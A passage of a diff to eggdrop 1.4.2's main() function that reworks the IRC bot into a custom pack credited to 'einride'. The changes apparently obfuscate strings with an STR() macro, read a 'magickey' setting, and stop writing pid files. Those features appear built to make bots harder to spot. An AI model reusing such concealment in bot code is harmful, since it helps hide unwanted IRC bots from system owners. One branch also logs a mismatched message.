+  buf[sizeof(buf) - 1] = 0;
+  if (strlen(buf) > 9) {
+    printf(STR("my settings are weird.\n"));
+    exit(0);
+  }
+  strcpy(botnetnick, buf);
+  get_setting(NAME_MKEY, magickey, sizeof(magickey));
+  get_setting(NAME_PACKNAME, packname, sizeof(packname));
+  sprintf(egg_version, STR("eggdrop 1.4.2 + %s %s by einride"), packname, PACKVERSION);
+  sprintf(ver, STR("eggdrop 1.4.2 + %s %s"), packname, PACKVERSION);
+  sprintf(version, STR("eggdrop 1.4.2 + %s %s by einride"), packname, PACKVERSION);
+
   Context;
 #ifdef STOP_UAC
   {
@@ -664,86 +913,53 @@ int main(int argc, char **argv)
   now = time(NULL);
   chanset = NULL;
   memcpy(&nowtm, localtime(&now), sizeof(struct tm));
+
   lastmin = nowtm.tm_min;
   srandom(now);
-  init_mem();
-  init_language(1);
+  init_log();
   if (argc > 1)
     for (i = 1; i < argc; i++)
       do_arg(argv[i]);
-  printf("\n%s\n", version);
+  checklockfile();
+  printf(STR("\n%s\n"), egg_version);
   init_dcc_max();
   init_userent();
+  init_userrec();
   init_misc();
   init_bots();
   init_net();
-  init_modules();
+#ifdef G_USETCL
   init_tcl(argc, argv);
-  init_language(0);
-#ifdef STATIC
-  link_statics();
+#else
+  init_bind();
 #endif
+  init_server();
+  init_irc();
+  init_channels();
+  init_ctcp();
+  init_transfer();
+  init_share();
   Context;
   strcpy(s, ctime(&now));
   s[strlen(s) - 1] = 0;
   strcpy(&s[11], &s[20]);
-  putlog(LOG_ALL, "*", "--- Loading %s (%s)", ver, s);
+  log(LCAT_INFO, STR("--- Loading %s (%s)"), egg_version, s);
   chanprog();
   Context;
-  if (encrypt_pass == 0) {
-    printf(MOD_NOCRYPT);
-    exit(1);
-  }
   i = 0;
   for (chan = chanset; chan; chan = chan->next)
     i++;
-  putlog(LOG_MISC, "*", "=== %s: %d channels, %d users.",
-	 botnetnick, i, count_users(userlist));
   cache_miss = 0;
   cache_hit = 0;
-  Context;
-  sprintf(pid_file, "pid.%s", botnetnick);
-  Context;
-  /* check for pre-existing eggdrop! */
-  f = fopen(pid_file, "r");
-  if (f != NULL) {
-    fgets(s, 10, f);
-    xx = atoi(s);
-    kill(xx, SIGCHLD);		/* meaningless kill to determine if pid
-				 * is used */
-    if (errno != ESRCH) {
-      printf(EGG_RUNNING1, origbotname);
-      printf(EGG_RUNNING2, pid_file);
-      exit(1);
-    }
-  }
   Context;
 #ifndef CYGWIN_HACKS
   /* move into background? */
   if (backgrd) {
     xx = fork();
     if (xx == -1)
-      fatal("CANNOT FORK PROCESS.", 0);
-    if (xx != 0) {
-      FILE *fp;
-
-      /* need to attempt to write pid now, not later */
-      unlink(pid_file);
-      fp = fopen(pid_file, "w");
-      if (fp != NULL) {
-	fprintf(fp, "%u\n", xx);
-	if (fflush(fp)) {
-	  /* kill bot incase a botchk is run from crond */
-	  printf(EGG_NOWRITE, pid_file);
-	  printf("  Try freeing some disk space\n");
-	  fclose(fp);
-	  unlink(pid_file);
-	  exit(1);
-	}
-	fclose(fp);
-      } else
-	printf(EGG_NOWRITE, pid_file);
-      printf("Launched into the background  (pid: %d)\n\n", xx);
+      fatal(STR("CANNOT FORK PROCESS."), 0);
+    if (xx) {
+      printf(STR("Launched into the background  (pid: %d)\n\n"), xx);
 #if HAVE_SETPGID
       setpgid(xx, xx);
 #endif
@@ -753,24 +969,6 @@ int main(int argc, char **argv)
 #endif
   use_stderr = 0;		/* stop writing to stderr now */
   xx = getpid();
-  if ((xx != 0) && (!backgrd)) {
-    FILE *fp;
-
-    /* write pid to file */
-    unlink(pid_file);
-    fp = fopen(pid_file, "w");
-    if (fp != NULL) {
-      fprintf(fp, "%u\n", xx);
-      if (fflush(fp)) {
-	/* let the bot live since this doesn't appear to be a botchk */
-	printf(EGG_NOWRITE, pid_file);
-	fclose(fp);
-	unlink(pid_file);
-      }
-      fclose(fp);
-    } else
-      printf(EGG_NOWRITE, pid_file);
-  }
   if (backgrd) {
     /* ok, try to disassociate from controlling terminal */
     /* (finger cross) */
@@ -778,59 +976,40 @@ int main(int argc, char **argv)
     setpgid(0, 0);
 #endif
     /* close out stdin/out/err */
-    freopen("/dev/null", "r", stdin);
-    freopen("/dev/null", "w", stdout);
-    freopen("/dev/null", "w", stderr);
+    freopen(STR("/dev/null"), "r", stdin);
+    freopen(STR("/dev/null"), "w", stdout);
+    freopen(STR("/dev/null"), "w", stderr);
 #ifdef CYGWIN_HACKS
     FreeConsole();
 #endif
     /* tcl wants those file handles kept open */
+
 /*    close(0); close(1); close(2);  */
   }
   /* terminal emulating dcc chat */
-  if ((!backgrd) && (term_z)) {
-    int n = new_dcc(&DCC_CHAT, sizeof(struct chat_info));
-
-    dcc[n].addr = iptolong(getmyip());
-    dcc[n].sock = STDOUT;
-    dcc[n].timeval = now;
-    dcc[n].u.chat->con_flags = conmask;
-    dcc[n].u.chat->strip_flags = STRIP_ALL;
-    dcc[n].status = STAT_ECHO;
-    strcpy(dcc[n].nick, "HQ");
-    strcpy(dcc[n].host, "llama@console");
-    dcc[n].user = get_user_by_handle(userlist, "HQ");
-    /* make sure there's an innocuous HQ user if needed */
-    if (!dcc[n].user) {
-      userlist = adduser(userlist, "HQ", "none", "-", USER_PARTY);
-      dcc[n].user = get_user_by_handle(userlist, "HQ");
-    }
-    setsock(STDOUT, 0);		/* entry in net table */
-    dprintf(n, "\n### ENTERING DCC CHAT SIMULATION ###\n\n");
-    dcc_chatter(n);
-  }
   then = now;
   online_since = now;
   autolink_cycle(NULL);		/* hurry and connect to tandem bots */
-  add_help_reference("cmds1.help");
-  add_help_reference("cmds2.help");
-  add_help_reference("core.help");
   add_hook(HOOK_SECONDLY, (Function) core_secondly);
+  add_hook(HOOK_10SECONDLY, (Function) core_10secondly);
+  add_hook(HOOK_30SECONDLY, (Function) core_30secondly);
   add_hook(HOOK_MINUTELY, (Function) core_minutely);
+  add_hook(HOOK_5MINUTELY, (Function) core_5minutely);
   add_hook(HOOK_HOURLY, (Function) core_hourly);
   add_hook(HOOK_REHASH, (Function) event_rehash);
   add_hook(HOOK_PRE_REHASH, (Function) event_prerehash);
-  add_hook(HOOK_USERFILE, (Function) event_save);
   add_hook(HOOK_DAILY, (Function) event_logfile);
 
-  debug0("main: entering loop");
+  debug0(STR("main: entering loop"));
   while (1) {
     int socket_cleanup = 0;
 
     Context;
+#ifdef G_USETCL
 #if !defined(HAVE_PRE7_5_TCL) && !defined(HAVE_TCL_THREADS)
     /* process a single tcl event */
     Tcl_DoOneEvent(TCL_ALL_EVENTS | TCL_DONT_WAIT);
+#endif
 #endif
     /* lets move some of this here, reducing the numer of actual
      * calls to periodic_timers */
@@ -858,45 +1037,40 @@ int main(int argc, char **argv)
 	if (dcc[idx].sock == xx) {
 	  if (dcc[idx].type && dcc[idx].type->activity)
 	    dcc[idx].type->activity(idx, buf, i);
-	  else
-	    putlog(LOG_MISC, "*",
-		   "!!! untrapped dcc activity: type %s, sock %d",
-		   dcc[idx].type->name, dcc[idx].sock);
+	  else {
+	    log(LCAT_ERROR, STR("!!! untrapped dcc activity: type %s, sock %d"), dcc[idx].type->name, dcc[idx].sock);
+	  }
 	  break;
 	}
     } else if (xx == -1) {	/* EOF from someone */
       int idx;
 
       if ((i == STDOUT) && !backgrd)
-	fatal("END OF FILE ON TERMINAL", 0);
+	fatal(STR("END OF FILE ON TERMINAL"), 0);
       Context;
       for (idx = 0; idx < dcc_total; idx++)
 	if (dcc[idx].sock == i) {
 	  if (dcc[idx].type && dcc[idx].type->eof)
 	    dcc[idx].type->eof(idx);
 	  else {
-	    putlog(LOG_MISC, "*",
-		   "*** ATTENTION: DEAD SOCKET (%d) OF TYPE %s UNTRAPPED",
-		   i, dcc[idx].type ? dcc[idx].type->name : "*UNKNOWN*");
+	    log(LCAT_ERROR, STR("!!! untrapped dcc activity: type %s, sock %d"), dcc[idx].type->name, dcc[idx].sock);
+	    log(LCAT_ERROR, STR("*** ATTENTION: DEAD SOCKET (%d) OF TYPE %s UNTRAPPED"), i, dcc[idx].type ? dcc[idx].type->name : STR("*UNKNOWN*"));
 	    killsock(i);
 	    lostdcc(idx);
 	  }
 	  idx = dcc_total + 1;
 	}
       if (idx == dcc_total) {
-	putlog(LOG_MISC, "*",
-	       "(@) EOF socket %d, not a dcc socket, not anything.", i);
+	log(LCAT_ERROR, STR("(@) EOF socket %d, not a dcc socket, not anything."), i);
 	close(i);
 	killsock(i);
       }
     } else if ((xx == -2) && (errno != EINTR)) {	/* select() error */
       Context;
-      putlog(LOG_MISC, "*", "* Socket error #%d; recovering.", errno);
+      log(LCAT_ERROR, STR("* Socket error #%d; recovering."), errno);
       for (i = 0; i < dcc_total; i++) {
 	if ((fcntl(dcc[i].sock, F_GETFD, 0) == -1) && (errno = EBADF)) {
-	  putlog(LOG_MISC, "*",
-		 "DCC socket %d (type %d, name '%s') expired -- pfft",
-		 dcc[i].sock, dcc[i].type, dcc[i].nick);
+	  log(LCAT_ERROR, STR("DCC socket %d (type %d, name '%s') expired -- pfft"), dcc[i].sock, dcc[i].type, dcc[i].nick);
 	  killsock(dcc[i].sock);
 	  lostdcc(i);
 	  i--;
@@ -910,45 +1084,11 @@ int main(int argc, char **argv)
       if (do_restart == -2)
 	rehash();
       else {
-	/* unload as many modules as possible */
-	int f = 1;
-	module_entry *p;
-	Function x;
-	char xx[256];
-
-	while (f) {
-	  f = 0;
-	  for (p = module_list; p != NULL; p = p->next) {
-	    dependancy *d = dependancy_list;
-	    int ok = 1;
-
-	    while (ok && d) {
-	      if (d->needed == p)
-		ok = 0;
-	      d = d->next;
-	    }
-	    if (ok) {
-	      strcpy(xx, p->name);
-	      if (module_unload(xx, origbotname) == NULL) {
-		f = 1;
-		break;
-	      }
-	    }
-	  }
-	}
-	p = module_list;
-	if (p && p->next && p->next->next)
-	  /* should be only 2 modules now -
-	   * blowfish & eggdrop */
-	  putlog(LOG_MISC, "*", MOD_STAGNANT);
 	Context;
-	flushlogs();
-	Context;
+#ifdef G_USETCL
 	kill_tcl();
 	init_tcl(argc, argv);
-	init_language(0);
-	x = p->funcs[MODCALL_START];
-	x(0);
+#endif
 	rehash();
 	restart_chons();
       }
